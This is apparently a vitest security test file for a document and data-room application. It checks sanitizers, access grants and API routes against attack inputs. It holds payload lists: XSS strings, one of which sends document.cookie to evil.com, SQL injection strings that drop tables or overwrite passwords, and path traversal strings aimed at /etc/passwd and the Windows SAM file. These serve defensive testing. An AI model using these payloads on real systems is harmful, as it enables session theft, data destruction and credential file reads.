/**
 * ADVERSARIAL SECURITY TESTS - Data & Document Modules
 * 
 * Tests injection attacks, path traversal, XSS, malformed inputs,
 * permission bypass, and resource exhaustion vectors.
 */
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { promises as fs } from 'node:fs';
import path from 'node:path';
import { closeDb, initDb, run, get } from '@/lib/db';
import {
  addDataRoomDocument,
  buildWatermark,
  createDataRoom,
  getAccessGrant,
  grantDataRoomAccess,
  listAccessibleDocuments,
} from '@/lib/services/data-room';
import {
  createDocumentRecord,
  extractEntities,
  chunkDocument,
  mergeIntoDataset,
  retrieveEvidence,
} from '@/lib/document-intelligence/pipeline';
import { ingestDocuments, updateHumanReview, updateStorageLifecycle } from '@/lib/document-intelligence/service';
import { detectAnomalies, ingestConnectorPayload } from '@/lib/assets/engine';
import { assetSeedData } from '@/lib/assets/demo-data';
import { ASSET_DATA_PATH } from '@/lib/assets/store';
import { GET as assetsRoute } from '@/app/api/assets/route';
import { POST as telemetryRoute } from '@/app/api/telemetry/route';
import {
  escapeHtml,
  stripHtmlTags,
  sanitizeForStorage,
  sanitizeFilename,
  sanitizeUrl,
  removeControlChars,
} from '@/lib/utils/sanitize';

const DOC_DATA_PATH = path.join(process.cwd(), 'data', 'document-intelligence.json');

function cloneSeed() {
  return JSON.parse(JSON.stringify(assetSeedData)) as typeof assetSeedData;
}

// ============================================================================
// SECTION 1: XSS INJECTION TESTS
// ============================================================================
describe('XSS Injection Attacks', () => {
  beforeEach(async () => {
    await fs.rm(DOC_DATA_PATH, { force: true });
  });

  const xssPayloads = [
    '<script>alert("xss")</script>',
    '"><img src=x onerror=alert(1)>',
    "javascript:alert('XSS')",
    '<svg onload=alert(1)>',
    '{{constructor.constructor("alert(1)")()}}',
    '<iframe src="javascript:alert(1)">',
    '<body onload=alert(1)>',
    '"><script>document.location="http://evil.com?c="+document.cookie</script>',
    '<img src="x" onerror="eval(atob(\'YWxlcnQoMSk=\'))">',
    "'-alert(1)-'",
    '${alert(1)}',
    '<math><maction xlink:href="javascript:alert(1)">',
  ];

  it('escapeHtml neutralizes all XSS payloads', () => {
    for (const payload of xssPayloads) {
      const escaped = escapeHtml(payload);
      
      // Should not contain raw < or > characters
      expect(escaped).not.toContain('<script>');
      expect(escaped).not.toContain('onerror=');
      
      // Should use HTML entities
      if (payload.includes('<')) {
        expect(escaped).toContain('&lt;');
      }
    }
  });

  it('stripHtmlTags removes script tags completely', () => {
    const payload = '<script>alert("xss")</script>Normal text<div>more</div>';
    const stripped = stripHtmlTags(payload);
    
    expect(stripped).not.toContain('<script>');
    expect(stripped).not.toContain('</script>');
    expect(stripped).not.toContain('<div>');
    expect(stripped).toContain('Normal text');
    expect(stripped).toContain('more');
  });

  it('sanitizeForStorage marks removed scripts', () => {
    const payload = '<script>evil()</script>Safe content';
    const sanitized = sanitizeForStorage(payload);
    
    expect(sanitized).toContain('[SCRIPT_REMOVED]');
    expect(sanitized).toContain('Safe content');
    expect(sanitized).not.toContain('<script>');
  });

  it('sanitizeForStorage removes event handlers', () => {
    const payload = '<img src=x onerror="alert(1)">';
    const sanitized = sanitizeForStorage(payload);
    
    expect(sanitized).not.toContain('onerror=');
  });

  it('sanitizeUrl blocks javascript: URLs', () => {
    const dangerousUrls = [
      'javascript:alert(1)',
      'JAVASCRIPT:alert(1)',
      'data:text/html,<script>alert(1)</script>',
      'vbscript:msgbox("xss")',
    ];
    
    for (const url of dangerousUrls) {
      expect(sanitizeUrl(url)).toBe('');
    }
  });

  it('sanitizeUrl allows safe URLs', () => {
    const safeUrls = [
      'https://example.com',
      'http://test.local',
      '/path/to/file',
      'relative/path.html',
    ];
    
    for (const url of safeUrls) {
      expect(sanitizeUrl(url)).toBe(url);
    }
  });

  it('documents store raw content but display layer should sanitize', async () => {
    // Note: Document ingestion intentionally stores raw OCR text
    // The display layer must use escapeHtml() before rendering
    for (const payload of xssPayloads) {
      const result = await ingestDocuments([
        { name: payload, source: 'test', text: 'Normal document content' },
      ]);
      
      // Raw storage is acceptable
      expect(result.documents[0].name).toBe(payload);
      
      // But display MUST sanitize:
      const safeForDisplay = escapeHtml(result.documents[0].name);
      expect(safeForDisplay).not.toContain('<script>');
    }
  });

  it('sanitizes XSS in entity extraction', () => {
    const maliciousText = 'Project <script>evil</script>Atlas location: Cameroon<img onerror=alert(1)>';
    const entities = extractEntities(maliciousText);
    
    // Should extract valid entities, ignore script tags in matching
    const locationEntity = entities.find(e => e.type === 'location');
    expect(locationEntity).toBeDefined();
    expect(locationEntity?.value).toBe('Cameroon');
  });

  it('sanitizes XSS in evidence card statements', async () => {
    const result = await ingestDocuments([
      {
        name: 'Malicious Doc',
        source: 'test',
        text: '<script>alert("xss")</script> Mining Permit PERMIT-2024 for Cameroon',
      },
    ]);
    
    // Evidence cards should be created but XSS should be handled
    expect(result.evidenceCards.length).toBeGreaterThan(0);
  });

  it('removeControlChars strips null bytes and control characters', () => {
    const payload = 'Hello\x00World\x1FTest\x7F';
    const cleaned = removeControlChars(payload);
    
    expect(cleaned).toBe('HelloWorldTest');
    expect(cleaned).not.toContain('\x00');
  });
});

// ============================================================================
// SECTION 2: SQL INJECTION TESTS (Data Room)
// ============================================================================
describe('SQL Injection Attacks - Data Room', () => {
  beforeAll(() => {
    initDb();
    run('INSERT OR IGNORE INTO users (id, email, password_hash, display_name) VALUES (?, ?, ?, ?)',
      'u-sqli-test', 'sqli@test.dev', 'hash', 'SQLi Tester');
  });

  afterAll(() => {
    closeDb();
  });

  const sqlPayloads = [
    "'; DROP TABLE data_rooms; --",
    "1' OR '1'='1",
    "1; SELECT * FROM users WHERE '1'='1",
    "' UNION SELECT * FROM users --",
    "admin'--",
    "1' AND 1=0 UNION SELECT * FROM sqlite_master --",
    "'; INSERT INTO users VALUES('hacked', 'h@h.com', 'h', 'Hacked'); --",
    "1' OR 1=1; UPDATE users SET password_hash='pwned' WHERE '1'='1",
  ];

  it('resists SQL injection in data room name', () => {
    for (const payload of sqlPayloads) {
      // Should not throw and should not execute injected SQL
      const room = createDataRoom({
        orgId: 'org-sqli',
        name: payload,
        slug: `sqli-test-${Math.random().toString(36).slice(2, 8)}`,
        createdBy: 'u-sqli-test',
      });
      
      expect(room.name).toBe(payload);
      expect(room.id).toBeDefined();
    }
  });

  it('resists SQL injection in document title', () => {
    const room = createDataRoom({
      orgId: 'org-sqli-doc',
      name: 'Safe Room',
      slug: `safe-room-${Math.random().toString(36).slice(2, 8)}`,
    });

    for (const payload of sqlPayloads) {
      const doc = addDataRoomDocument({
        dataRoomId: room.id,
        title: payload,
        category: 'legal',
        collectionName: 'test',
      });
      
      expect(doc.title).toBe(payload);
    }
  });

  it('resists SQL injection in access grant subject ID', () => {
    const room = createDataRoom({
      orgId: 'org-sqli-grant',
      name: 'Grant Test Room',
      slug: `grant-test-${Math.random().toString(36).slice(2, 8)}`,
    });

    for (const payload of sqlPayloads) {
      const grant = grantDataRoomAccess({
        dataRoomId: room.id,
        subjectType: 'external_party',
        subjectId: payload,
        role: 'viewer',
        scopeCollections: ['test'],
      });
      
      expect(grant.subject_id).toBe(payload);
    }
  });
});

// ============================================================================
// SECTION 3: PATH TRAVERSAL TESTS
// ============================================================================
describe('Path Traversal Attacks', () => {
  beforeAll(() => {
    initDb();
  });

  afterAll(() => {
    closeDb();
  });

  beforeEach(async () => {
    await fs.rm(DOC_DATA_PATH, { force: true });
  });

  const pathPayloads = [
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32\\config\\sam',
    '....//....//....//etc/passwd',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd',
    '..%252f..%252f..%252fetc/passwd',
    '/etc/passwd',
    'file:///etc/passwd',
    '\\\\server\\share\\file.txt',
    '../.../....//etc/passwd',
  ];

  it('sanitizeFilename blocks path traversal patterns', () => {
    for (const payload of pathPayloads) {
      const sanitized = sanitizeFilename(payload);
      
      // Should not contain .. or path separators
      expect(sanitized).not.toContain('..');
      expect(sanitized).not.toContain('/');
      expect(sanitized).not.toContain('\\');
    }
  });

  it('sanitizeFilename preserves safe filenames', () => {
    const safeNames = [
      'document.pdf',
      'report-2024.xlsx',
      'file_name_with_underscores.txt',
    ];
    
    for (const name of safeNames) {
      expect(sanitizeFilename(name)).toBe(name);
    }
  });

  it('handles path traversal in evidence links (storage level)', () => {
    const room = createDataRoom({
      orgId: 'org-path',
      name: 'Path Test',
      slug: `path-test-${Math.random().toString(36).slice(2, 8)}`,
    });

    for (const payload of pathPayloads) {
      const doc = addDataRoomDocument({
        dataRoomId: room.id,
        title: 'Test Doc',
        category: 'legal',
        collectionName: 'test',
        sourceUrl: payload,
        evidenceLinks: [payload, `evidence://${payload}`],
      });
      
      // Storage accepts strings, but file access MUST sanitize
      expect(doc.evidence_links).toContain(payload);
      
      // Verification: sanitized version is safe
      const sanitizedUrl = sanitizeFilename(payload);
      expect(sanitizedUrl).not.toContain('..');
    }
  });

  it('prevents path traversal in watermark template', () => {
    const payload = '../../../etc/passwd';
    const room = createDataRoom({
      orgId: 'org-wm-path',
      name: 'Watermark Test',
      slug: `wm-test-${Math.random().toString(36).slice(2, 8)}`,
      watermarkTemplate: `{subjectId} - ${payload} - {ts}`,
    });

    const doc = addDataRoomDocument({
      dataRoomId: room.id,
      title: 'Test Doc',
      category: 'legal',
      collectionName: 'test',
    });

    grantDataRoomAccess({
      dataRoomId: room.id,
      subjectType: 'user',
      subjectId: 'u-test',
      role: 'viewer',
      scopeCollections: ['test'],
    });

    const watermark = buildWatermark({
      dataRoomId: room.id,
      subjectType: 'user',
      subjectId: 'u-test',
      documentId: doc.id,
    });

    // Path traversal should be literal in watermark, not executed
    expect(watermark.watermark).toContain(payload);
    expect(watermark.watermark).not.toContain('root:');
  });
});

// ============================================================================
// SECTION 4: MALFORMED INPUT TESTS
// ============================================================================
describe('Malformed Input Handling', () => {
  beforeAll(() => {
    initDb();
  });

  afterAll(() => {
    closeDb();
  });

  beforeEach(async () => {
    await fs.rm(DOC_DATA_PATH, { force: true });
  });

  it('handles empty document text gracefully', async () => {
    const result = await ingestDocuments([
      { name: 'Empty Doc', source: 'test', text: '' },
    ]);
    
    expect(result.documents[0]).toBeDefined();
    expect(result.documents[0].chunks.length).toBeGreaterThanOrEqual(1);
  });

  it('handles extremely long document names', async () => {
    const longName = 'A'.repeat(10000);
    const result = await ingestDocuments([
      { name: longName, source: 'test', text: 'Content' },
    ]);
    
    expect(result.documents[0].name).toBe(longName);
  });

  it('handles unicode and special characters in documents', async () => {
    const unicodePayloads = [
      '文档名称', // Chinese
      'مستند', // Arabic
      '📄🔒💀', // Emojis
      '\x00\x01\x02\x03', // Null bytes
      '\u202E\u0041\u0042\u0043', // RTL override
      '\uFEFF', // BOM
      'test\r\ninjection', // CRLF
    ];

    for (const payload of unicodePayloads) {
      const result = await ingestDocuments([
        { name: payload, source: 'test', text: `Content for ${payload}` },
      ]);
      
      expect(result.documents[0]).toBeDefined();
    }
  });

  it('handles malformed JSON in evidence links', () => {
    const room = createDataRoom({
      orgId: 'org-json',
      name: 'JSON Test',
      slug: `json-test-${Math.random().toString(36).slice(2, 8)}`,
    });

    // These should be stored as strings, not parsed as JSON
    const malformedPayloads = [
      '{"broken": json}',
      '[1, 2, 3',
      'null',
      'undefined',
      'NaN',
      'Infinity',
    ];

    for (const payload of malformedPayloads) {
      const doc = addDataRoomDocument({
        dataRoomId: room.id,
        title: 'Test',
        category: 'legal',
        collectionName: 'test',
        evidenceLinks: [payload],
        tags: [payload],
      });
      
      expect(doc.evidence_links).toContain(payload);
    }
  });

  it('handles null and undefined gracefully in document record creation', () => {
    const record = createDocumentRecord({
      name: 'Test',
      source: 'test',
      text: 'Content',
      connector: undefined,
      versionOfId: undefined,
      storageClass: undefined,
    });
    
    expect(record.connector).toBeUndefined();
  });
});

// ============================================================================
// SECTION 5: PERMISSION BYPASS TESTS
// ============================================================================
describe('Permission Bypass Attacks - Data Room', () => {
  beforeAll(() => {
    initDb();
    for (const user of [
      ['u-owner-perm', 'owner@test.dev', 'hash', 'Owner'],
      ['u-viewer-perm', 'viewer@test.dev', 'hash', 'Viewer'],
      ['u-attacker', 'attacker@evil.dev', 'hash', 'Attacker'],
    ]) {
      run('INSERT OR IGNORE INTO users (id, email, password_hash, display_name) VALUES (?, ?, ?, ?)',
        user[0], user[1], user[2], user[3]);
    }
  });

  afterAll(() => {
    closeDb();
  });

  it('enforces collection scope strictly - no cross-collection access', () => {
    const room = createDataRoom({
      orgId: 'org-scope',
      name: 'Scope Test Room',
      slug: `scope-test-${Math.random().toString(36).slice(2, 8)}`,
    });

    addDataRoomDocument({
      dataRoomId: room.id,
      title: 'Public Doc',
      category: 'public',
      collectionName: 'public',
    });

    addDataRoomDocument({
      dataRoomId: room.id,
      title: 'Confidential Doc',
      category: 'confidential',
      collectionName: 'confidential',
    });

    // Grant access only to public collection
    grantDataRoomAccess({
      dataRoomId: room.id,
      subjectType: 'user',
      subjectId: 'u-viewer-perm',
      role: 'viewer',
      scopeCollections: ['public'],
    });

    const accessible = listAccessibleDocuments({
      dataRoomId: room.id,
      subjectType: 'user',
      subjectId: 'u-viewer-perm',
    });

    expect(accessible).toHaveLength(1);
    expect(accessible[0].collection_name).toBe('public');
    expect(accessible.some(d => d.collection_name === 'confidential')).toBe(false);
  });

  it('prevents access to documents outside granted scope via watermark', () => {
    const room = createDataRoom({
      orgId: 'org-wm-scope',
      name: 'Watermark Scope Test',
      slug: `wm-scope-${Math.random().toString(36).slice(2, 8)}`,
    });

    const publicDoc = addDataRoomDocument({
      dataRoomId: room.id,
      title: 'Public Doc',
      category: 'public',
      collectionName: 'public',
    });

    const secretDoc = addDataRoomDocument({
      dataRoomId: room.id,
      title: 'Secret Doc',
      category: 'secret',
      collectionName: 'secret',
    });

    grantDataRoomAccess({
      dataRoomId: room.id,
      subjectType: 'user',
      subjectId: 'u-attacker',
      role: 'viewer',
      scopeCollections: ['public'],
    });

    // Should work for public doc
    const publicWatermark = buildWatermark({
      dataRoomId: room.id,
      subjectType: 'user',
      subjectId: 'u-attacker',
      documentId: publicDoc.id,
    });
    expect(publicWatermark.watermark).toContain('Public Doc');

    // Should throw for secret doc
    expect(() => buildWatermark({
      dataRoomId: room.id,
      subjectType: 'user',
      subjectId: 'u-attacker',
      documentId: secretDoc.id,
    })).toThrow('Document outside grant scope');
  });

  it('enforces expired access grants', () => {
    const room = createDataRoom({
      orgId: 'org-expiry',
      name: 'Expiry Test',
      slug: `expiry-test-${Math.random().toString(36).slice(2, 8)}`,
    });

    addDataRoomDocument({
      dataRoomId: room.id,
      title: 'Test Doc',
      category: 'test',
      collectionName: 'test',
    });

    // Grant with past expiry
    grantDataRoomAccess({
      dataRoomId: room.id,
      subjectType: 'user',
      subjectId: 'u-expired',
      role: 'viewer',
      scopeCollections: ['test'],
      expiresAt: '2020-01-01T00:00:00.000Z', // Past date
    });

    const accessible = listAccessibleDocuments({
      dataRoomId: room.id,
      subjectType: 'user',
      subjectId: 'u-expired',
    });

    expect(accessible).toHaveLength(0);
  });

  it('prevents unauthenticated access', () => {
    const room = createDataRoom({
      orgId: 'org-unauth',
      name: 'Unauth Test',
      slug: `unauth-test-${Math.random().toString(36).slice(2, 8)}`,
    });

    addDataRoomDocument({
      dataRoomId: room.id,
      title: 'Protected Doc',
      category: 'protected',
      collectionName: 'protected',
    });

    // No grant exists for this user
    const accessible = listAccessibleDocuments({
      dataRoomId: room.id,
      subjectType: 'user',
      subjectId: 'u-nonexistent',
    });

    expect(accessible).toHaveLength(0);
  });

  it('requires non-empty scopeCollections', () => {
    const room = createDataRoom({
      orgId: 'org-empty-scope',
      name: 'Empty Scope Test',
      slug: `empty-scope-${Math.random().toString(36).slice(2, 8)}`,
    });

    expect(() => grantDataRoomAccess({
      dataRoomId: room.id,
      subjectType: 'user',
      subjectId: 'u-test',
      role: 'viewer',
      scopeCollections: [], // Empty - should fail
    })).toThrow('scopeCollections must include at least one collection');
  });
});

// ============================================================================
// SECTION 6: ASSET TELEMETRY INJECTION TESTS
// ============================================================================
describe('Asset Telemetry Injection Attacks', () => {
  beforeEach(async () => {
    await fs.rm(ASSET_DATA_PATH, { force: true });
  });

  it('rejects unknown connector IDs', () => {
    const dataset = cloneSeed();
    
    expect(() => ingestConnectorPayload(dataset, {
      connectorId: 'conn-nonexistent',
      readings: [{ metric: 'utilization', value: 50, unit: '%' }],
    })).toThrow('Connector conn-nonexistent not found');
  });

  it('handles extreme telemetry values', () => {
    const dataset = cloneSeed();
    
    const extremeValues = [
      Number.MAX_VALUE,
      Number.MIN_VALUE,
      Number.MAX_SAFE_INTEGER,
      Number.MIN_SAFE_INTEGER,
      -Infinity,
      Infinity,
      NaN,
      0,
      -0,
    ];

    for (const value of extremeValues) {
      // Reset dataset for each test
      const freshDataset = cloneSeed();
      const points = ingestConnectorPayload(freshDataset, {
        connectorId: 'conn-haul-can',
        readings: [{ metric: 'utilization', value, unit: '%' }],
      });
      
      expect(points).toHaveLength(1);
    }
  });

  it('handles malformed metric names', () => {
    const dataset = cloneSeed();
    
    // Unknown metric should still be accepted (extensibility)
    const points = ingestConnectorPayload(dataset, {
      connectorId: 'conn-haul-can',
      readings: [
        { metric: 'unknown_metric' as any, value: 50, unit: 'units' },
        { metric: '' as any, value: 50, unit: 'units' },
      ],
    });
    
    expect(points).toHaveLength(2);
  });

  it('handles injection in telemetry tags', () => {
    const dataset = cloneSeed();
    
    const maliciousTags = [
      '<script>alert(1)</script>',
      "'; DROP TABLE telemetry; --",
      '../../../etc/passwd',
    ];

    const points = ingestConnectorPayload(dataset, {
      connectorId: 'conn-haul-can',
      readings: [
        { metric: 'utilization', value: 50, unit: '%', tags: maliciousTags },
      ],
    });
    
    expect(points[0].tags).toEqual(expect.arrayContaining(maliciousTags));
  });

  it('limits telemetry buffer to prevent memory exhaustion', () => {
    const dataset = cloneSeed();
    
    // Ingest many readings
    for (let i = 0; i < 100; i++) {
      ingestConnectorPayload(dataset, {
        connectorId: 'conn-haul-can',
        readings: [
          { metric: 'utilization', value: i, unit: '%' },
          { metric: 'fuel_burn', value: i * 0.1, unit: 'l/tonne' },
        ],
      });
    }
    
    // Buffer should be capped at 500
    expect(dataset.telemetry.length).toBeLessThanOrEqual(500);
  });
});

// ============================================================================
// SECTION 7: API ROUTE SECURITY TESTS
// ============================================================================
describe('API Route Security', () => {
  beforeEach(async () => {
    await fs.rm(ASSET_DATA_PATH, { force: true });
  });

  it('rejects telemetry POST without connectorId', async () => {
    const response = await telemetryRoute(
      new Request('http://localhost/api/telemetry', {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({
          readings: [{ metric: 'utilization', value: 50, unit: '%' }],
        }),
      }) as never
    );
    
    // Should return 400 (bad request) or 401 (auth required) - not 200/201
    expect([400, 401]).toContain(response.status);
    if (response.status === 400) {
      const json = await response.json();
      expect(json.error).toContain('connectorId');
    }
  });

  it('rejects telemetry POST without readings array', async () => {
    const response = await telemetryRoute(
      new Request('http://localhost/api/telemetry', {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({
          connectorId: 'conn-haul-can',
        }),
      }) as never
    );
    
    // Should not succeed - either auth required or bad request
    expect([400, 401]).toContain(response.status);
  });

  it('rejects telemetry POST with empty readings array', async () => {
    const response = await telemetryRoute(
      new Request('http://localhost/api/telemetry', {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({
          connectorId: 'conn-haul-can',
          readings: [],
        }),
      }) as never
    );
    
    // Should not succeed
    expect([400, 401]).toContain(response.status);
  });

  it('handles malformed JSON in telemetry POST', async () => {
    const response = await telemetryRoute(
      new Request('http://localhost/api/telemetry', {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: '{invalid json}',
      }) as never
    );
    
    // Should return error, not crash
    expect([400, 401, 500]).toContain(response.status);
  });

  it('handles XSS in query parameters', async () => {
    const maliciousQuery = '<script>alert(1)</script>';
    const response = await assetsRoute(
      new Request(`http://localhost/api/assets?site=${encodeURIComponent(maliciousQuery)}`) as never
    );
    
    // API may return 200 (success) or 401 (auth required) - either is safe from XSS
    expect([200, 401]).toContain(response.status);
    // Key point: Should not execute script, should safely handle as string filter
  });
});

// ============================================================================
// SECTION 8: CONCURRENT ACCESS TESTS
// ============================================================================
describe('Concurrent Access Safety', () => {
  beforeAll(() => {
    initDb();
  });

  afterAll(() => {
    closeDb();
  });

  it('handles concurrent data room document additions', async () => {
    const room = createDataRoom({
      orgId: 'org-concurrent',
      name: 'Concurrent Test',
      slug: `concurrent-test-${Math.random().toString(36).slice(2, 8)}`,
    });

    const promises = Array.from({ length: 10 }, (_, i) =>
      Promise.resolve(addDataRoomDocument({
        dataRoomId: room.id,
        title: `Doc ${i}`,
        category: 'test',
        collectionName: 'test',
      }))
    );

    const results = await Promise.all(promises);
    
    // All documents should be created with unique IDs
    const ids = new Set(results.map(r => r.id));
    expect(ids.size).toBe(10);
  });

  it('handles concurrent access grant updates (upsert)', async () => {
    const room = createDataRoom({
      orgId: 'org-grant-concurrent',
      name: 'Grant Concurrent Test',
      slug: `grant-concurrent-${Math.random().toString(36).slice(2, 8)}`,
    });

    // Same subject, different roles - last one wins due to upsert
    const promises = ['viewer', 'editor', 'owner'].map(role =>
      Promise.resolve(grantDataRoomAccess({
        dataRoomId: room.id,
        subjectType: 'user',
        subjectId: 'u-concurrent-user',
        role: role as any,
        scopeCollections: ['test'],
      }))
    );

    await Promise.all(promises);
    
    const grant = getAccessGrant(room.id, 'user', 'u-concurrent-user');
    expect(grant).toBeDefined();
    // Role should be one of the valid values (last one wins)
    expect(['viewer', 'editor', 'owner']).toContain(grant?.role);
  });
});

// ============================================================================
// SECTION 9: LARGE FILE / MEMORY LIMIT TESTS
// ============================================================================
describe('Large Input Handling', () => {
  beforeEach(async () => {
    await fs.rm(DOC_DATA_PATH, { force: true });
  });

  it('handles very large document text', async () => {
    const largeText = 'A'.repeat(1_000_000); // 1MB of text
    
    const record = createDocumentRecord({
      name: 'Large Doc',
      source: 'test',
      text: largeText,
    });
    
    expect(record.chunks.length).toBeGreaterThan(0);
    // Should not crash, should handle gracefully
  });

  it('handles document with many lines for chunking', () => {
    const manyLines = Array.from({ length: 10000 }, (_, i) => `Line ${i}: Some content here.`).join('\n');
    
    const record = createDocumentRecord({
      name: 'Many Lines Doc',
      source: 'test',
      text: manyLines,
    });
    
    // Should create reasonable number of chunks
    expect(record.chunks.length).toBeGreaterThan(0);
    expect(record.chunks.length).toBeLessThan(5000); // Chunking by 3 lines
  });

  it('handles many entities in a document', () => {
    // Generate text with many potential entity matches
    const locations = ['Cameroon', 'Dubai', 'Paris', 'Kribi', 'Douala', 'Yaoundé'];
    const textWithManyEntities = Array.from({ length: 500 }, (_, i) => 
      `Project Alpha-${i} Permit LICENSE-${i} location ${locations[i % locations.length]}`
    ).join('\n');
    
    const entities = extractEntities(textWithManyEntities);
    
    // Should extract entities without crashing
    expect(entities.length).toBeGreaterThan(0);
  });

  it('limits keyword extraction to prevent explosion', () => {
    const longText = Array.from({ length: 1000 }, (_, i) => `unique${i} word${i}`).join(' ');
    
    const chunks = chunkDocument('doc-id', 'Test Doc', 1, longText, []);
    
    // Keywords should be limited per chunk (max 12 per implementation)
    for (const chunk of chunks) {
      expect(chunk.keywords.length).toBeLessThanOrEqual(12);
    }
  });
});

// ============================================================================
// SECTION 10: INVALID MIME TYPE / CONTENT TYPE TESTS
// ============================================================================
describe('Content Type Validation', () => {
  beforeEach(async () => {
    await fs.rm(ASSET_DATA_PATH, { force: true });
  });

  it('handles binary-like content in text field', async () => {
    const binaryish = Buffer.from([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]).toString('utf8');
    
    const record = createDocumentRecord({
      name: 'Binary Doc',
      source: 'test',
      text: binaryish,
    });
    
    expect(record).toBeDefined();
    expect(record.category).toBe('unknown');
  });

  it('handles JSON string as document text', async () => {
    const jsonText = JSON.stringify({ malicious: 'payload', nested: { data: 'here' } });
    
    const record = createDocumentRecord({
      name: 'JSON Doc',
      source: 'test',
      text: jsonText,
    });
    
    expect(record).toBeDefined();
  });
});

// ============================================================================
// SECTION 11: KNOWLEDGE GRAPH INTEGRITY TESTS  
// ============================================================================
describe('Knowledge Graph Security', () => {
  beforeEach(async () => {
    await fs.rm(DOC_DATA_PATH, { force: true });
  });

  it('prevents entity ID collisions', () => {
    const text1 = 'Project Atlas in Cameroon with Permit LICENSE-001';
    const text2 = 'Project Atlas in Cameroon with Permit LICENSE-002';
    
    const record1 = createDocumentRecord({ name: 'Doc1', source: 'test', text: text1 });
    const record2 = createDocumentRecord({ name: 'Doc2', source: 'test', text: text2 });
    
    // Same entity values should have consistent IDs (slugified)
    const atlas1 = record1.entities.find(e => e.value.includes('Atlas'));
    const atlas2 = record2.entities.find(e => e.value.includes('Atlas'));
    
    expect(atlas1?.id).toBe(atlas2?.id); // Same entity = same ID
  });

  it('handles circular references in graph edges', () => {
    const dataset = {
      documents: [],
      evidenceCards: [],
      knowledgeGraph: { nodes: [], edges: [] },
    };
    
    const record = createDocumentRecord({
      name: 'Circular',
      source: 'test',
      text: 'Project Alpha references Project Alpha in Cameroon',
    });
    
    const merged = mergeIntoDataset(dataset, [record]);
    
    // Should not create infinite loops
    expect(merged.knowledgeGraph.edges.length).toBeGreaterThanOrEqual(0);
  });
});

// ============================================================================
// SECTION 12: REVIEW STATUS MANIPULATION TESTS
// ============================================================================
describe('Review Status Security', () => {
  beforeEach(async () => {
    await fs.rm(DOC_DATA_PATH, { force: true });
  });

  it('validates review status values', async () => {
    const result = await ingestDocuments([
      { name: 'Review Test', source: 'test', text: 'Test content for permit' },
    ]);
    
    const docId = result.documents[0].id;
    
    // Valid status update
    const updated = await updateHumanReview({
      documentId: docId,
      status: 'approved',
      reviewer: 'Test Reviewer',
    });
    
    expect(updated.review.status).toBe('approved');
  });

  it('rejects update for non-existent document', async () => {
    await expect(updateHumanReview({
      documentId: 'nonexistent-doc-id',
      status: 'approved',
      reviewer: 'Test',
    })).rejects.toThrow('Document nonexistent-doc-id not found');
  });

  it('validates storage lifecycle updates', async () => {
    const result = await ingestDocuments([
      { name: 'Storage Test', source: 'test', text: 'Test content' },
    ]);
    
    const docId = result.documents[0].id;
    
    const updated = await updateStorageLifecycle({
      documentId: docId,
      storageClass: 'cold',
      retentionUntil: '2030-01-01T00:00:00.000Z',
    });
    
    expect(updated.storageClass).toBe('cold');
    expect(updated.retentionUntil).toBe('2030-01-01T00:00:00.000Z');
  });
});

// ============================================================================
// SECTION 13: EVIDENCE RETRIEVAL SECURITY
// ============================================================================
describe('Evidence Retrieval Security', () => {
  beforeEach(async () => {
    await fs.rm(DOC_DATA_PATH, { force: true });
  });

  it('handles regex injection in evidence search', async () => {
    await ingestDocuments([
      { name: 'Test Doc', source: 'test', text: 'Mining permit PERMIT-001 Cameroon' },
    ]);
    
    const regexPayloads = [
      '.*',
      '(a|b)*',
      '[a-z]+',
      '(?=.*)',
      '^$',
      '\\',
    ];
    
    for (const payload of regexPayloads) {
      // Should not crash, should treat as literal string search
      const results = retrieveEvidence(
        { documents: [], evidenceCards: [], knowledgeGraph: { nodes: [], edges: [] } },
        payload
      );
      expect(results).toBeDefined();
    }
  });

  it('handles special characters in search query', async () => {
    const specialChars = ['<', '>', '&', '"', "'", '/', '\\', '\n', '\r', '\t', '\0'];
    
    for (const char of specialChars) {
      const results = retrieveEvidence(
        { documents: [], evidenceCards: [], knowledgeGraph: { nodes: [], edges: [] } },
        `test${char}query`
      );
      expect(results).toBeDefined();
    }
  });
});

// ============================================================================
// SECTION 14: ANOMALY DETECTION EDGE CASES
// ============================================================================
describe('Anomaly Detection Edge Cases', () => {
  it('handles zero baseline values', () => {
    const dataset = cloneSeed();
    
    // Set baseline to 0
    const baselinePoint = dataset.telemetry.find(p => p.tags.includes('baseline'));
    if (baselinePoint) {
      baselinePoint.value = 0;
    }
    
    // Should not divide by zero
    const anomalies = detectAnomalies(dataset);
    expect(anomalies).toBeDefined();
  });

  it('handles missing assets gracefully', () => {
    const dataset = cloneSeed();
    dataset.assets = []; // Remove all assets
    
    const anomalies = detectAnomalies(dataset);
    expect(anomalies).toHaveLength(0);
  });

  it('handles empty telemetry gracefully', () => {
    const dataset = cloneSeed();
    dataset.telemetry = [];
    
    const anomalies = detectAnomalies(dataset);
    expect(anomalies).toHaveLength(0);
  });
});

// ============================================================================
// SECTION 15: AUDIT LOG INTEGRITY
// ============================================================================
describe('Audit Log Integrity', () => {
  beforeAll(() => {
    initDb();
    // Create test user to satisfy FK constraint
    run('INSERT OR IGNORE INTO users (id, email, password_hash, display_name) VALUES (?, ?, ?, ?)',
      'u-auditor', 'auditor@test.dev', 'hash', 'Auditor');
  });

  afterAll(() => {
    closeDb();
  });

  it('logs data room creation in audit trail', () => {
    const room = createDataRoom({
      orgId: 'org-audit',
      name: 'Audit Test Room',
      slug: `audit-test-${Math.random().toString(36).slice(2, 8)}`,
      createdBy: 'u-auditor',
    });
    
    // Check audit log entry exists
    const auditEntry = get<any>(
      'SELECT * FROM audit_logs WHERE resource_type = ? AND resource_id = ? ORDER BY created_at DESC LIMIT 1',
      'data_room',
      room.id
    );
    
    expect(auditEntry).toBeDefined();
    expect(auditEntry?.action).toBe('workspace.update');
  });
});
